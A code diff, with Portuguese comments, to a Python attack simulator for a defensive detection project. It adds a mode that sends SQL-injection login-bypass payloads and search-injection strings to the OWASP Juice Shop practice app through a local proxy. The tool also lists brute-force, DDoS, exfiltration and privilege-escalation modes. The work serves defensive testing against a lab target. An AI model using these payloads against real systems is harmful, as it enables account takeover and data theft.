@@ -7,13 +7,15 @@ Modos:
   ddos          — Volume alto de requests concorrentes
   exfil         — Tenta dump completo via /pg/query
   privesc       — User comum tenta acessar tabela sensível
-  full          — Roda todos sequencialmente
+  full          — Roda todos sequencialmente (contra o server.py caseiro)
+  juice-shop    — SQLi contra o OWASP Juice Shop, via proxy (alvo :9000)
 
 Uso:
   python -m access_defense.attacker --mode sqli
   python -m access_defense.attacker --mode brute-force --rounds 50
   python -m access_defense.attacker --mode ddos --concurrency 20 --requests 200
   python -m access_defense.attacker --target http://localhost:8000 --mode full
+  python -m access_defense.attacker --target http://localhost:9000 --mode juice-shop
 """
 
 from __future__ import annotations
@@ -91,12 +93,22 @@ BRUTE_FORCE_PASSWORDS = [
 # ============================================================================
 
 
+def _body(r) -> dict:
+    # O server.py devolve 403 em JSON, mas o proxy.py devolve em texto puro
+    # ("ip blocked: ..."). Lê os dois sem quebrar, pra o 403 contar como
+    # bloqueio e nao como erro.
+    try:
+        return r.json()
+    except Exception:
+        return {"_raw": r.text[:500]}
+
+
 def _post(target: str, path: str, payload: dict, timeout: float = 5.0) -> dict | None:
     try:
         r = requests.post(target + path, json=payload, timeout=timeout)
         if r.status_code == 403:
-            return {"_blocked": True, "status": 403, "body": r.json()}
-        return {"status": r.status_code, "body": r.json()}
+            return {"_blocked": True, "status": 403, "body": _body(r)}
+        return {"status": r.status_code, "body": _body(r)}
     except Exception as exc:
         return {"_error": str(exc)}
 
@@ -105,8 +117,8 @@ def _get(target: str, path: str, params: dict, timeout: float = 5.0) -> dict | N
     try:
         r = requests.get(target + path, params=params, timeout=timeout)
         if r.status_code == 403:
-            return {"_blocked": True, "status": 403, "body": r.json()}
-        return {"status": r.status_code, "body": r.json()}
+            return {"_blocked": True, "status": 403, "body": _body(r)}
+        return {"status": r.status_code, "body": _body(r)}
     except Exception as exc:
         return {"_error": str(exc)}
 
@@ -226,6 +238,56 @@ def attack_privesc(target: str) -> AttackReport:
 
 
 # ============================================================================
+# ALVO OWASP — JUICE SHOP (via proxy.py)
+# ============================================================================
+
+# Endpoints nativos do OWASP Juice Shop (estáveis, documentados pela OWASP).
+# O request passa pelo proxy (:9000), que loga em access_logs e aplica o 403.
+JUICESHOP_LOGIN = "/rest/user/login"
+JUICESHOP_SEARCH = "/rest/products/search"
+
+# Payloads de login específicos do Juice Shop. Diferente do server.py (Postgres,
+# tabela própria), o Juice Shop usa SQLite com schema próprio, então os bypass
+# que funcionam são outros. Estes são os auth-bypass clássicos documentados pela
+# OWASP (campo 'email'): fecham a string e comentam o resto da query, logando
+# como o 1º usuário da tabela (o admin). Sucesso = devolve token de autenticação.
+JUICESHOP_LOGIN_PAYLOADS = [
+    {"email": "' OR true--", "password": "x"},
+    {"email": "' OR 1=1--", "password": "x"},
+    {"email": "admin@juice-sh.op'--", "password": "x"},
+]
+
+
+def attack_juiceshop(target: str) -> AttackReport:
+    """SQLi contra o OWASP Juice Shop, pelos endpoints nativos. Aponte --target
+    para o proxy, ex.: http://localhost:9000 (ou http://proxy:9000 dentro do
+    Docker), pra entrar no ciclo de defesa (access_logs + 403).
+    """
+    report = AttackReport(mode="juice-shop")
+    started = time.perf_counter()
+
+    # 1) SQLi no login — auth-bypass pelo campo 'email'.
+    #    Sucesso = Juice Shop devolveu token de autenticação (invasão real).
+    for body in JUICESHOP_LOGIN_PAYLOADS:
+        resp = _post(target, JUICESHOP_LOGIN, body)
+        _tally(
+            report, resp,
+            lambda b: bool((b.get("authentication") or {}).get("token")),
+        )
+
+    # 2) SQLi na busca de produtos — injeção via querystring 'q'.
+    #    Reusa os payloads de SQLi do server.py como tráfego de ataque: mesmo
+    #    quando não extraem dados do schema do Juice Shop, são detectados e
+    #    bloqueados pela IA (que é o ponto do ciclo de defesa).
+    for payload in SQLI_SEARCH_PAYLOADS:
+        resp = _get(target, JUICESHOP_SEARCH, {"q": payload})
+        _tally(report, resp, lambda b: len(b.get("data", [])) > 0)
+
+    report.duration_s = round(time.perf_counter() - started, 3)
+    return report
+
+
+# ============================================================================
 # CLI
 # ============================================================================
 
@@ -237,6 +299,7 @@ MODES = {
     "ddos": lambda t: attack_ddos(t),
     "exfil": attack_exfil,
     "privesc": attack_privesc,
+    "juice-shop": attack_juiceshop,
 }
 
 
@@ -254,7 +317,9 @@ def main():
     args = parser.parse_args()
 
     if args.mode == "full":
-        reports = [fn(args.target) for fn in MODES.values()]
+        # 'full' ataca o server.py caseiro; juice-shop tem endpoints próprios
+        # e alvo próprio (o proxy :9000), então fica de fora e é rodado à parte.
+        reports = [fn(args.target) for name, fn in MODES.items() if name != "juice-shop"]
     elif args.mode == "brute-force":
         reports = [attack_brute_force(args.target, rounds=args.rounds)]
     elif args.mode == "ddos":
